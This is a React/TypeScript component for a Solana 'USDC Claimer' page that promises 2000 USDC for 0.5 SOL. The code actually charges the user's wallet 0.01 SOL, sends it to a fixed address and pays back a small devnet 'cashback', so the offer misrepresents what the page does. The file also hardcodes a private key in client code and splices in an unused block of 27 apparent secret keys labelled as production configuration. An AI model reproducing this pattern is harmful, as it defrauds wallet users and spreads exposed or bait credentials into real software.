/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "66oifknmrtzi2HgH6RtsYXxZta4gwYjF441aFWYNGGFPYWJWdtTK8FsshHM8UHZp9asuHryRz3K4ji3oFyUeS5G4"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3TujFmynNhyuL2Po7c7PShAoNJKXuxGByUqTt6Y3ks85fXw86nFi1mPfiWdntQZWwwUgUUw7subvCtidvWcTDL4S",
  "key1": "48xnRtzuppC7oQicS3GnsJYrutiPbsjj2iASHP62XghMT2kyrhMKuBTSw98RrKHCo7b94HSaxVyNvznF6cJkUFhL",
  "key2": "4eJaSgwrn42ZzVyWUP5EraP9gug2teSHPUVnyNAaPfK9Gguizfr9J2xmn4GBC18pHKtQDvJfcBgxTfPkiMmPPCxL",
  "key3": "UJYezmdaNq8KXbDUCGBSYesckhKjqQhWuwYaoJPe1ApyMWbvCLMg3q8JwHZPCqikyorS5BP93fhJRtanQewdHMC",
  "key4": "3NqAQpVjn9MRd3t8LUMDX8aQDtVdhNmHGbXQVJnHD6s4GA7UYU8tKvMB5m6Xn2egStXDbQWNKyyNHr3hcjBk4H8",
  "key5": "5mEDKtdgf6Ac93pE8HfXYRimfjEgJqVLdkwCbQomE2vwqhjzV5E3JJ2aq8XMZjsLNt76sTPwyft2sbRWYp8fUxEN",
  "key6": "5U5vJgbTSPGhfkbUoAviHoXSjALrYBcbqu6EgXHSizrsFYuVD9RkCes3EeVULQv32QwFCRtUpDd19Cx4aYqVyLKT",
  "key7": "24MFiPUEaCwZcMNUCDRDicfaci7LC3jbVRbdeFocwr4EF2qGquRbjPDojfRihgqdqbGiXi3pgoxi137cgvqA3fAY",
  "key8": "5rt7LJEMfkuJhBDuwR15BT4SNiLHwUk8x93LfenLNRr3GjDGDTQAF7gdzNPotFqVcXfUiAqmTfpzEPFne4ZBn8cH",
  "key9": "27ggwmaCQWqLP8rAiAVNdhVetBBSCZ2u1Cb7sm6pmkDSutyaPnao5htgTCBvRpqRvNKKzJW1Jky1R4gry79ZMGqK",
  "key10": "2FpYsvBssPsFNE3K3Jhv3aZihBF5fUG6aSTUi1sqi9X6MGrtn7K3DKNoCeqzKSi5GV7JdpSVSPkUibS5Vq56GUKB",
  "key11": "3dtZ5Ton5FCtNsi3J2PRHn8SDY27LEua3Guez83g6LKzJYCPJt9GBY9TroEE3GV18gTo3qA8K9FGP6VYwDE7tveL",
  "key12": "4kpW5qgEAdpDACo3he72vLgFadydrdkcJev8VLQpfyjaGzVvRCW5CMZYKBr1kMpXXbYfQTpzvLFKiYxbMTvt9YFo",
  "key13": "5rM6coUug1LWLyJauNRwQgdhiYNM8tD6DCpPUoa3ZP8q8DN2VZJUk2hfFXFKa1MS5wDzmvTnxCbVpP4HXA4kZxPY",
  "key14": "2ZQSjugZGr1vCbLnbfVwUUm2ydXJWvKg8fxaASCC1iNrex3UcsiANwmMLcuWnrcAz7wDTxfHpnt31ysNjhB1zBeV",
  "key15": "2W8oUZCNFnXNoBBJWPvUz3nttM1Yoi5Qs3zP1PhNg2dFGBHdVL33rMj3qHsgfzSknZ39VXxXHpgTb1q2rHuTNTT1",
  "key16": "5rmB7Acojkh759qgi7BSKf3qYEbMDsGQquZGkRspskz3NEbswxy8emfA1gHFkmCpKnKzcxM9wQv7qmJfrgRvpMey",
  "key17": "31vNCUi4trUZdNfAnCxtLKVxQDwun47p4bfBM9QJH9tyHDcSEiPuonznxiaQqA6JMFRDDfvD25wJ47i21rboGUmH",
  "key18": "iSNFwCyfiNdtU2TWT6evieL3i2nKmR6EQLN5n6fT3Rpi5LevixmbvaXU4aZfWqN4TmT8y8SeNjWGkesqNGEpQTr",
  "key19": "3EzZz6swz3q5SawdtT7HZjVrAHrHg995A9D1aGSS6KRuBXfiM4wxMo2XZaVJiTpaHPAnjhXQ6HCLvviyaEJZGVLp",
  "key20": "vpdoSS4VfAungdVn72ejPqWQzqjuen8TdPngiKZdBQyLGiWxXoBST5SQPasHi5NwiPeeNJmXuY1YaNUQSTtQ1pe",
  "key21": "5BcFkUfPaSESaGZ1fNLTzqn8CYtvuhkk911XYUmSqrc9ZHhDkxrPTNSgXP8QvPJypN7briaVCdWVtv8VVSz5e6JB",
  "key22": "a61QFbmyx8KwSYsyqPaMELJqTaAbArgAc4n42CtVD4AgRcCzadGkaDCZErXPAVoGT884HjZ1yQpY4GJm1DKY1A4",
  "key23": "5E5BrKKT32kDXe8XAH2iMJHPBPx9D5dwGhykY1goJ7q9nVSZxgpFjV2QCryL3aiU5h26BpsFdjmpcMB2hgZeteNR",
  "key24": "4eqmJ2BPvvwnMb5vVsBLJxQFx7SFCUgCQKVx7qcybgba4dQoQJrppRQVUEEjvC3dKPhJ7aWAo6BYubGkG4iwMDoJ",
  "key25": "KKBQwyoX3Me6yd5cXUZ42miYGn4X1k8Hs96MyRYttRgwgA8HdkiWHKXtdBHwjFp78Ha7mc6PzZ33Vz2dD9RahyZ",
  "key26": "37AEZuqWXnCidPSXV4T5EGxM6MFUxuEhthn9jqprjL6tQn2eRVUMmXxoEPyerTkx47NEYcRoE66Pz4mRVzbuGhW"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
